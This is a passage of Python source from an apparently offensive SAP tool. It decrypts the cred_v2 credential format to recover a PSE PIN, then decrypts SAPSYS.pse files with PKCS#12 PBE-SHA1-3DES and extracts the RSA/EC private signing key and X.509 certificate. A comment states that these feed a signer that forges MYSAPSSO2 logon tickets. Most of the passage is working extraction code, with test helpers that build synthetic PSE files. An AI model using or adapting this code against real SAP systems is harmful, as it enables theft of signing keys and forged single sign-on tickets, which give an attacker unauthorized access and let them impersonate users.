        username: OS username for key derivation.
        algo:     0 = 3DES (default), 1 = AES-256.
        salt:     16-byte salt (random if ``None``).
        iv:       16-byte IV (random if ``None``).

    Returns:
        The complete cred_v2 BER-encoded bytes.
    """
    # 1. Build inner plaintext: SEQUENCE { IA5String(pin) }
    inner = _ber_tlv(_BER_SEQUENCE,
                     _ber_tlv(_BER_IA5STRING,
                              pin.encode("ascii")))

    # 2. XOR obfuscation (pre-encrypt)
    obfuscated = _lcg_xor(inner, _POST_DECRYPT_SEED)

    # 3. Encrypt
    cipher_bytes = _encrypt_for_cred_v2(
        obfuscated, username, algo=algo, salt=salt, iv=iv)

    # 4. Wrap in BER: credential record + outer SEQUENCE
    record = _ber_tlv(_BER_SEQUENCE, b"".join([
        _ber_tlv(_BER_IA5STRING, b"CN=test"),
        _ber_tlv(_BER_IA5STRING, b""),
        _ber_tlv(_BER_IA5STRING,
                 pse_path.encode("ascii")),
        _ber_tlv(_BER_IA5STRING, b""),
        _ber_tlv(_BER_BITSTRING, b"\x00" + cipher_bytes),
    ]))
    return _ber_tlv(_BER_SEQUENCE, record)


def _encrypt_for_cred_v2(plaintext: bytes, username: str,
                           algo: int = 0, salt: bytes = None,
                           iv: bytes = None) -> bytes:
    """Encrypt plaintext using the cred_v2 format-1 scheme.

    Returns the cipher blob (36-byte header + ciphertext).
    Used by ``_build_cred_v2_blob`` for round-trip tests.
    """
    try:
        from cryptography.hazmat.primitives.ciphers import (
            Cipher, algorithms, modes)
        try:
            from cryptography.hazmat.decrepit.ciphers.algorithms \
                import TripleDES
        except ImportError:
            from cryptography.hazmat.primitives.ciphers.algorithms \
                import TripleDES
    except ImportError as e:
        raise RuntimeError(
            f"cryptography library not available: {e}")

    if salt is None:
        salt = os.urandom(16)
    if iv is None:
        iv = os.urandom(16)

    # Key derivation (same as _derive_and_decrypt_v1)
    user_bytes = username.encode("ascii")
    xored_user = _lcg_xor(user_bytes, salt[0])

    h = hashlib.sha256()
    h.update(_CRED_KEY_FMT)
    h.update(bytes([1, algo, 0, 0]))
    h.update(salt)
    h.update(xored_user)
    digest = h.digest()
    derived = _lcg_xor(digest, salt[1])

    # Build header
    header = bytes([1, algo, 0, 0]) + salt + iv

    if algo == 0:
        # 3DES: only iv[:8] is the actual CBC IV.  The header's
        # iv_field[8:16] stores the FIRST 8 bytes of ciphertext
        # (the decrypt path reconstructs full ct as
        # iv_field[8:] + blob[36:]).
        actual_iv = iv[:8]
        pad_len = 8 - (len(plaintext) % 8)
        padded_plain = plaintext + bytes([pad_len]) * pad_len
        key = derived[:24]
        enc = Cipher(TripleDES(key),
                     modes.CBC(actual_iv)).encryptor()
        full_ct = enc.update(padded_plain) + enc.finalize()
        # Split ciphertext: first block → header iv[8:], rest stored
        header = (bytes([1, algo, 0, 0]) + salt +
                  actual_iv + full_ct[:8])
        return header + full_ct[8:]
    elif algo == 1:
        # AES-256-CBC
        pad_len = 16 - (len(plaintext) % 16)
        padded_plain = plaintext + bytes([pad_len]) * pad_len
        key = derived[:32]
        enc = Cipher(algorithms.AES(key),
                     modes.CBC(iv)).encryptor()
        ct = enc.update(padded_plain) + enc.finalize()
    else:
        raise ValueError(f"unsupported algo byte: {algo}")

    return header + ct


# ===================================================================
# Commit 3 — PSE signing-key extractor
# ===================================================================
#
# Parses the SAP-proprietary SAPSYS.pse binary format, decrypts with
# the PIN recovered from cred_v2, and extracts the RSA/EC private key
# + X.509 signer certificate.  These are the inputs to the PKCS#7
# signer that forges MYSAPSSO2 logon tickets (Phase B).
#
# The PSE format is NOT PKCS#12 — it's a SAP-proprietary ASN.1
# envelope around encrypted PSE objects.  The encryption uses
# PKCS#12 PBE1 (RFC 7292 Appendix B) as the key derivation, with
# SHA-1 + 3DES-CBC as the cipher (OID 1.2.840.113549.1.12.1.3).
#
# Two version variants: v2 (common on NW 7.x) and v4 (newer kernels).
# Version 256 (LPS) is not yet supported.
# ===================================================================


# ---------------------------------------------------------------------------
# BER additions for PSE parsing
# ---------------------------------------------------------------------------

_BER_PRINTABLESTRING = 0x13
_BER_GENERALIZEDTIME = 0x18
_BER_OID = 0x06
_BER_CTX_0 = 0xA0   # context-specific, constructed, [0]  (v2)
_BER_CTX_3 = 0xA3   # context-specific, constructed, [3]  (v4)


def _ber_decode_oid(data: bytes) -> str:
    """Decode a BER OID value (tag already stripped) into dotted string."""
    if not data:
        return ""
    components = [str(data[0] // 40), str(data[0] % 40)]
    value = 0
    for byte in data[1:]:
        value = (value << 7) | (byte & 0x7F)
        if byte & 0x80 == 0:
            components.append(str(value))
            value = 0
    return ".".join(components)


def _ber_encode_oid(oid_str: str) -> bytes:
    """Encode a dotted OID string into BER OID value bytes."""
    parts = [int(x) for x in oid_str.split(".")]
    if len(parts) < 2:
        raise ValueError("OID must have at least 2 components")
    result = bytearray([40 * parts[0] + parts[1]])
    for p in parts[2:]:
        if p == 0:
            result.append(0)
        else:
            chunks = []
            tmp = p
            while tmp > 0:
                chunks.append(tmp & 0x7F)
                tmp >>= 7
            chunks.reverse()
            for i, c in enumerate(chunks):
                result.append(c | 0x80 if i < len(chunks) - 1
                              else c)
    return bytes(result)


# ---------------------------------------------------------------------------
# PKCS#12 PBKDF1 (RFC 7292 Appendix B)
# ---------------------------------------------------------------------------
# SAP's PBE1-SHA1-3DES uses this for key + IV derivation.  This is
# NOT the same as PKCS#5 PBKDF1 — the algorithm is significantly
# more complex.

def _pkcs12_password(pin: str) -> bytes:
    """Encode a PIN for PKCS#12 key derivation.

    Per RFC 7292: UTF-16BE + trailing NUL pair (\\x00\\x00).
    An empty password is just \\x00\\x00.
    """
    if not pin:
        return b"\x00\x00"
    return pin.encode("utf-16-be") + b"\x00\x00"


def _pkcs12_pbkdf1(password: bytes, salt: bytes,
                    iterations: int, id_byte: int,
                    key_len: int) -> bytes:
    """PKCS#12 PBKDF1 (RFC 7292 Appendix B).

    Args:
        password: UTF-16BE + NUL-NUL from :func:`_pkcs12_password`.
        salt:     8-byte salt from the PSE algorithm parameters.
        iterations: Hash iteration count (typically 2048 or 10000).
        id_byte:  1 = key material, 2 = IV material, 3 = MAC key.
        key_len:  Desired output length in bytes.

    Returns:
        Derived key material of exactly *key_len* bytes.
    """
    u = 20   # SHA-1 digest length
    v = 64   # SHA-1 block size

    # Step 1: diversifier D
    D = bytes([id_byte]) * v

    # Step 2: construct I = S || P (each padded to multiple of v)
    if salt:
        s_len = v * ((len(salt) + v - 1) // v)
        S = (salt * (s_len // len(salt) + 1))[:s_len]
    else:
        S = b""
    if password:
        p_len = v * ((len(password) + v - 1) // v)
        P = (password * (p_len // len(password) + 1))[:p_len]
    else:
        P = b""
    I = bytearray(S + P)

    # Step 3: iterate and concatenate
    c = (key_len + u - 1) // u
    result = b""
    for j in range(c):
        A = hashlib.sha1(D + bytes(I)).digest()
        for _ in range(iterations - 1):
            A = hashlib.sha1(A).digest()
        result += A

        if j < c - 1:
            # Update I for next round
            B = (A * (v // len(A) + 1))[:v]
            B_int = int.from_bytes(B, "big")
            for k in range(0, len(I), v):
                I_block = int.from_bytes(I[k:k + v], "big")
                new_val = (I_block + B_int + 1) % (1 << (v * 8))
                I[k:k + v] = new_val.to_bytes(v, "big")

    return result[:key_len]


# ---------------------------------------------------------------------------
# PSE decryption
# ---------------------------------------------------------------------------

_OID_PBE1_SHA1_3DES = "1.2.840.113549.1.12.1.3"

# PSE object OIDs (1.3.36.2.x.x namespace — German TeleTrusT)
_KEY_OIDS = {
    "1.3.36.2.3.1",   # SignSK — signing private key
    "1.3.36.2.3.4",   # SKnew — current private key
    "1.3.36.2.3.5",   # SKold — previous private key
}
_CERT_OIDS = {
    "1.3.36.2.1.1",   # SignCert — signing certificate
    "1.3.36.2.1.3",   # Cert — generic certificate
}


def _parse_algorithm_params(alg_seq: bytes):
    """Parse an AlgorithmIdentifier SEQUENCE value.

    Returns ``(oid_str, salt_bytes, iterations)``.
    """
    children = list(_ber_children(alg_seq, 0, len(alg_seq)))
    if not children:
        raise ValueError("empty AlgorithmIdentifier")

    oid_str = ""
    salt = b""
    iterations = 0

    for tag, val in children:
        if tag == _BER_OID:
            oid_str = _ber_decode_oid(val)
        elif tag == _BER_SEQUENCE:
            # Parameters sub-SEQUENCE: {OCTET STRING salt, INT iter}
            for ptag, pval in _ber_children(val, 0, len(val)):
                if ptag == _BER_OCTETSTRING:
                    salt = pval
                elif ptag == _BER_INTEGER:
                    iterations = int.from_bytes(pval, "big")

    return oid_str, salt, iterations


def _pbe1_decrypt(cipher: bytes, pin: str,
                   salt: bytes, iterations: int) -> bytes:
    """Decrypt PSE content using PBE1-SHA1-3DES-CBC."""
    try:
        from cryptography.hazmat.primitives.ciphers import (
            Cipher, modes)
        try:
            from cryptography.hazmat.decrepit.ciphers.algorithms \
                import TripleDES
        except ImportError:
            from cryptography.hazmat.primitives.ciphers.algorithms \
                import TripleDES
    except ImportError as e:
        raise RuntimeError(
            f"cryptography library not available: {e}")

    password = _pkcs12_password(pin)
    key = _pkcs12_pbkdf1(password, salt, iterations,
                          id_byte=1, key_len=24)
    iv = _pkcs12_pbkdf1(password, salt, iterations,
                         id_byte=2, key_len=8)

    # Pad cipher to block size if needed
    if len(cipher) % 8 != 0:
        cipher = cipher + b"\x00" * (8 - len(cipher) % 8)

    dec = Cipher(TripleDES(key), modes.CBC(iv)).decryptor()
    plain = dec.update(cipher) + dec.finalize()
    return _strip_pkcs5(plain)


def _decrypt_pse(pse_bytes: bytes, pin: str) -> bytes:
    """Parse + decrypt a SAPSYS.pse file.

    Handles v2 (tag 0xA0) and v4 (tag 0xA3) formats.
    Returns the decrypted PSE content bytes.
    """
    # Outer SEQUENCE
    tag, voff, vlen, _ = _ber_read_tl(pse_bytes, 0)
    if tag != _BER_SEQUENCE:
        raise ValueError(
            f"PSE: expected outer SEQUENCE, got 0x{tag:02X}")

    children = list(_ber_children(pse_bytes, voff, voff + vlen))
    if len(children) < 2:
        raise ValueError("PSE: outer SEQUENCE has < 2 children")

    # First child: INTEGER version
    ver_tag, ver_val = children[0]
    if ver_tag != _BER_INTEGER:
        raise ValueError(
            f"PSE: expected INTEGER version, got 0x{ver_tag:02X}")
    version = int.from_bytes(ver_val, "big")

    if version == 256:
        raise ValueError(
            "PSE version 256 (LPS) is not yet supported")

    # Second child: context-specific container
    cont_tag, cont_val = children[1]
    if cont_tag not in (_BER_CTX_0, _BER_CTX_3):
        raise ValueError(
            f"PSE: unexpected container tag 0x{cont_tag:02X}")

    # Parse inner SEQUENCE
    inner = list(_ber_children(cont_val, 0, len(cont_val)))
    if not inner:
        raise ValueError("PSE: empty encrypted container")

    # The inner content is a SEQUENCE; parse its children
    inner_tag, inner_val = inner[0]
    if inner_tag != _BER_SEQUENCE:
        raise ValueError(
            f"PSE: expected inner SEQUENCE, got "
            f"0x{inner_tag:02X}")

    enc_children = list(
        _ber_children(inner_val, 0, len(inner_val)))

    # Extract components based on version
    encrypted_pin_bytes = b""
    alg_seq_bytes = b""
    cipher_bytes = b""

    if version in (2,):
        # v2: [OCTET(enc_pin), SEQ(alg_id), OCTET(cipher)]
        for ec_tag, ec_val in enc_children:
            if ec_tag == _BER_SEQUENCE and not alg_seq_bytes:
                alg_seq_bytes = ec_val
            elif ec_tag == _BER_OCTETSTRING:
                if not encrypted_pin_bytes:
                    encrypted_pin_bytes = ec_val
                else:
                    cipher_bytes = ec_val
    elif version in (4,):
        # v4: [INT(1), SEQ(alg_id), OCTET(cipher), OCTET(enc_pin)]
        octets = []
        for ec_tag, ec_val in enc_children:
            if ec_tag == _BER_SEQUENCE:
                alg_seq_bytes = ec_val
            elif ec_tag == _BER_OCTETSTRING:
                octets.append(ec_val)
        if len(octets) >= 2:
            cipher_bytes = octets[0]
            encrypted_pin_bytes = octets[1]
        elif len(octets) == 1:
            cipher_bytes = octets[0]
    else:
        raise ValueError(f"unsupported PSE version {version}")

    if not alg_seq_bytes:
        raise ValueError("PSE: no algorithm identifier found")
    if not cipher_bytes:
        raise ValueError("PSE: no cipher text found")

    oid, salt, iterations = _parse_algorithm_params(
        alg_seq_bytes)
    if oid != _OID_PBE1_SHA1_3DES:
        raise ValueError(
            f"PSE: unsupported algorithm OID {oid}")

    return _pbe1_decrypt(cipher_bytes, pin, salt, iterations)


# ---------------------------------------------------------------------------
# PSE object extraction
# ---------------------------------------------------------------------------

def _parse_pse_objects(decrypted: bytes) -> list:
    """Parse decrypted PSE content into a list of named objects.

    Expected structure:
        SEQUENCE { alg_id, GeneralizedTime, INT,
                   SET { obj1, obj2, ... } }

    Each object:
        SEQUENCE { PrintableString(name), GeneralizedTime(created),
                   OID(type), <value bytes> }

    Returns list of dicts:
        ``[{name, oid, value_bytes}, ...]``
    """
    objects = []

    # Outer SEQUENCE
    tag, voff, vlen, _ = _ber_read_tl(decrypted, 0)
    if tag != _BER_SEQUENCE:
        raise ValueError("decrypted PSE: expected outer SEQUENCE")

    # Find the SET child (contains the objects)
    set_val = None
    for ctag, cval in _ber_children(decrypted, voff, voff + vlen):
        if ctag == _BER_SET:
            set_val = cval
            break

    if set_val is None:
        raise ValueError("decrypted PSE: no SET of objects found")

    # Each child of the SET is one PSE object SEQUENCE
    for otag, oval in _ber_children(set_val, 0, len(set_val)):
        if otag != _BER_SEQUENCE:
            continue

        name = ""
        oid = ""
        value_bytes = b""
        obj_children = list(
            _ber_children(oval, 0, len(oval)))

        for i, (ct, cv) in enumerate(obj_children):
            if ct == _BER_PRINTABLESTRING and not name:
                name = cv.decode("ascii", errors="replace")
            elif ct == _BER_OID and not oid:
                oid = _ber_decode_oid(cv)
            elif ct in (_BER_OCTETSTRING, _BER_BITSTRING,
                        _BER_SEQUENCE, _BER_SET) and oid:
                # First substantial child after the OID = value
                if ct == _BER_BITSTRING and cv and cv[0] == 0:
                    value_bytes = cv[1:]
                elif ct == _BER_OCTETSTRING:
                    value_bytes = cv
                else:
                    # Re-encode as TLV so the consumer gets the
                    # full DER structure
                    value_bytes = _ber_tlv(ct, cv)
                break

        if name:
            objects.append({
                "name": name,
                "oid": oid,
                "value_bytes": value_bytes,
            })

    return objects


# ---------------------------------------------------------------------------
# Public API — extract_signing_key
# ---------------------------------------------------------------------------

def extract_signing_key(pse_bytes: bytes, pin: str) -> dict:
    """Extract the private key + certificate from a SAPSYS.pse.

    Args:
        pse_bytes: Raw SAPSYS.pse file content (from
                   :func:`extract_pse_bundle`).
        pin:       Cleartext PSE PIN (from :func:`decrypt_cred_v2`).

    Returns:
        ``{success, private_key, certificate, issuer_dn, subject_dn,
           serial_number, key_type, key_size, not_before, not_after,
           objects, error}``

        *private_key* is a ``cryptography`` private key object
        (RSAPrivateKey / EllipticCurvePrivateKey / DSAPrivateKey).
        *certificate* is an ``x509.Certificate``.
    """
    result = {
        "success": False,
        "private_key": None,
        "certificate": None,
        "issuer_dn": "",
        "subject_dn": "",
        "serial_number": 0,
        "key_type": "",
        "key_size": 0,
        "not_before": None,
        "not_after": None,
        "objects": [],
        "error": "",
    }

    if not pse_bytes:
        result["error"] = "empty PSE blob"
        return result

    # Step 1: decrypt the PSE
    try:
        decrypted = _decrypt_pse(pse_bytes, pin)
    except Exception as e:
        result["error"] = f"PSE decryption failed: {e}"
        return result

    # Step 2: parse objects
    try:
        objects = _parse_pse_objects(decrypted)
    except Exception as e:
        result["error"] = f"PSE object parsing failed: {e}"
        return result

    result["objects"] = [
        {"name": o["name"], "oid": o["oid"],
         "size": len(o["value_bytes"])}
        for o in objects
    ]

    # Step 3: find private key
    try:
        from cryptography.hazmat.primitives.serialization import (
            load_der_private_key)
        from cryptography.x509 import load_der_x509_certificate
        from cryptography.hazmat.primitives.asymmetric import (
            rsa, ec, dsa)
    except ImportError as e:
        result["error"] = f"cryptography library import failed: {e}"
        return result

    for obj in objects:
        if obj["oid"] in _KEY_OIDS and obj["value_bytes"]:
            try:
                pk = load_der_private_key(
                    obj["value_bytes"], password=None)
                result["private_key"] = pk
                if isinstance(pk, rsa.RSAPrivateKey):
                    result["key_type"] = "RSA"
                    result["key_size"] = pk.key_size
                elif isinstance(pk, ec.EllipticCurvePrivateKey):
                    result["key_type"] = "EC"
                    result["key_size"] = pk.key_size
                elif isinstance(pk, dsa.DSAPrivateKey):
                    result["key_type"] = "DSA"
                    result["key_size"] = pk.key_size
                break
            except Exception:
                # Value might not be a plain DER key — try
                # unwrapping one level if it starts with SEQUENCE
                try:
                    inner_tag, ioff, ilen, _ = _ber_read_tl(
                        obj["value_bytes"], 0)
                    if inner_tag == _BER_SEQUENCE:
                        pk = load_der_private_key(
                            obj["value_bytes"][ioff:ioff + ilen],
                            password=None)
                        result["private_key"] = pk
                        if isinstance(pk, rsa.RSAPrivateKey):
                            result["key_type"] = "RSA"
                            result["key_size"] = pk.key_size
                        elif isinstance(
                                pk, ec.EllipticCurvePrivateKey):
                            result["key_type"] = "EC"
                            result["key_size"] = pk.key_size
                        break
                except Exception:
                    pass

    # Step 4: find certificate
    for obj in objects:
        if obj["oid"] in _CERT_OIDS and obj["value_bytes"]:
            try:
                cert = load_der_x509_certificate(
                    obj["value_bytes"])
                result["certificate"] = cert
                result["subject_dn"] = cert.subject.rfc4514_string()
                result["issuer_dn"] = cert.issuer.rfc4514_string()
                result["serial_number"] = cert.serial_number
                result["not_before"] = cert.not_valid_before_utc
                result["not_after"] = cert.not_valid_after_utc
                break
            except Exception:
                # Try unwrapping OCTET STRING / SEQUENCE
                try:
                    inner_tag, ioff, ilen, _ = _ber_read_tl(
                        obj["value_bytes"], 0)
                    cert = load_der_x509_certificate(
                        obj["value_bytes"][ioff:ioff + ilen])
                    result["certificate"] = cert
                    result["subject_dn"] = (
                        cert.subject.rfc4514_string())
                    result["issuer_dn"] = (
                        cert.issuer.rfc4514_string())
                    result["serial_number"] = cert.serial_number
                    break
                except Exception:
                    pass

    if result["private_key"] and result["certificate"]:
        result["success"] = True
    elif result["private_key"]:
        result["error"] = ("private key found but no matching "
                           "certificate in PSE objects")
    elif result["certificate"]:
        result["error"] = ("certificate found but no private "
                           "key in PSE objects")
    else:
        result["error"] = (
            f"neither private key nor certificate found "
            f"in {len(objects)} PSE objects: "
            f"{[o['name'] for o in objects]}")

    return result


# ---------------------------------------------------------------------------
# Test helper — build a synthetic PSE file
# ---------------------------------------------------------------------------

def _build_test_pse(key_der: bytes, cert_der: bytes,
                     pin: str, salt: bytes = None,
                     iterations: int = 2048) -> bytes:
    """Build a synthetic SAPSYS.pse file for testing.

    Creates a v2 PSE with PBE1-SHA1-3DES encryption containing:
      - SKnew (private key) with OID 1.3.36.2.3.4
      - SignCert (certificate) with OID 1.3.36.2.1.1

    Args:
        key_der:    DER-encoded private key bytes.
        cert_der:   DER-encoded X.509 certificate bytes.
        pin:        PSE PIN for encryption.
        salt:       8-byte salt (random if None).
        iterations: PBE iteration count.

    Returns:
        The complete PSE file as bytes.
    """
    try:
        from cryptography.hazmat.primitives.ciphers import (
            Cipher, modes)
        try:
            from cryptography.hazmat.decrepit.ciphers.algorithms \
                import TripleDES
        except ImportError:
            from cryptography.hazmat.primitives.ciphers.algorithms \
                import TripleDES
    except ImportError as e:
        raise RuntimeError(
            f"cryptography library not available: {e}")

    if salt is None:
        salt = os.urandom(8)

    timestamp = b"20260101120000Z"  # GeneralizedTime

    # Build PSE objects
    obj_key = _ber_tlv(_BER_SEQUENCE, b"".join([
        _ber_tlv(_BER_PRINTABLESTRING, b"SKnew"),
        _ber_tlv(_BER_GENERALIZEDTIME, timestamp),
        _ber_tlv(_BER_OID,
                 _ber_encode_oid("1.3.36.2.3.4")),
        _ber_tlv(_BER_OCTETSTRING, key_der),
    ]))
    obj_cert = _ber_tlv(_BER_SEQUENCE, b"".join([
        _ber_tlv(_BER_PRINTABLESTRING, b"SignCert"),
        _ber_tlv(_BER_GENERALIZEDTIME, timestamp),
        _ber_tlv(_BER_OID,
                 _ber_encode_oid("1.3.36.2.1.1")),
        _ber_tlv(_BER_OCTETSTRING, cert_der),
    ]))

    # Decrypted PSE content structure:
    # SEQUENCE { alg_id, GeneralizedTime, INT(1), SET { objects } }
    alg_id = _ber_tlv(_BER_SEQUENCE, b"".join([
        _ber_tlv(_BER_OID,
                 _ber_encode_oid(_OID_PBE1_SHA1_3DES)),
        _ber_tlv(_BER_SEQUENCE, b"".join([
            _ber_tlv(_BER_OCTETSTRING, salt),
            _ber_tlv(_BER_INTEGER,
                     iterations.to_bytes(
                         (iterations.bit_length() + 7) // 8,
                         "big")),
        ])),
    ]))
    content = _ber_tlv(_BER_SEQUENCE, b"".join([
        alg_id,
        _ber_tlv(_BER_GENERALIZEDTIME, timestamp),
        _ber_tlv(_BER_INTEGER, b"\x01"),
        _ber_tlv(_BER_SET, obj_key + obj_cert),
    ]))

    # Encrypt the content
    password = _pkcs12_password(pin)
    key = _pkcs12_pbkdf1(password, salt, iterations,
                          id_byte=1, key_len=24)
    iv = _pkcs12_pbkdf1(password, salt, iterations,
                         id_byte=2, key_len=8)

    # PKCS5 pad
    pad_len = 8 - (len(content) % 8)
    padded = content + bytes([pad_len]) * pad_len

    enc = Cipher(TripleDES(key), modes.CBC(iv)).encryptor()
    cipher = enc.update(padded) + enc.finalize()

    # Build encrypted PIN (encrypt the PIN bytes for validation)
    pin_bytes = pin.encode("ascii")
    pin_pad_len = 8 - (len(pin_bytes) % 8)
    pin_padded = pin_bytes + bytes([pin_pad_len]) * pin_pad_len
    pin_enc = Cipher(TripleDES(key), modes.CBC(iv)).encryptor()
    enc_pin = pin_enc.update(pin_padded) + pin_enc.finalize()

    # v2 outer structure:
    # SEQUENCE { INT(2), [0xA0] { SEQUENCE {
    #     OCTET(enc_pin), SEQ(alg_id), OCTET(cipher) } } }
    inner_seq = _ber_tlv(_BER_SEQUENCE, b"".join([
        _ber_tlv(_BER_OCTETSTRING, enc_pin),
        alg_id,
        _ber_tlv(_BER_OCTETSTRING, cipher),
    ]))
    container = _ber_tlv(_BER_CTX_0, inner_seq)
    pse = _ber_tlv(_BER_SEQUENCE, b"".join([
        _ber_tlv(_BER_INTEGER, b"\x02"),  # version 2
        container,
    ]))
    return pse
